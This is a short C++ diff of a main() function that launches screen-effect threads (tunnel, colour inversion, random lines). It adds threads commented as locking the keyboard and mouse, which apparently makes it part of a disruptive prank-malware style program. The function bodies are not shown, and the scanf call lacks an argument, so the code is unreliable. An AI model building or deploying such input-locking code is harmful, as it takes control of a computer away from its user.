@@ -11,12 +11,8 @@ int main(){
     thread e(infChange); // Invert String
     thread f(inftunnel); // Draw Tunnel Effect 
     thread g(randomDraw); // Random Draw Lines
+    thread h(LockKeyboard); // Original Function To Lock Keyboard
+    thread i(LockMouse); // Original Function To Lock Mouse
+    thread j(AllLock,true); // New Function To Lock Keyboard & Mouse
     scanf("%s"); // Pause Program
-    /*
-    infclick();
-    infInvColor();
-    infIcon();
-    infCursor();
-    infChange();
-    */
 }
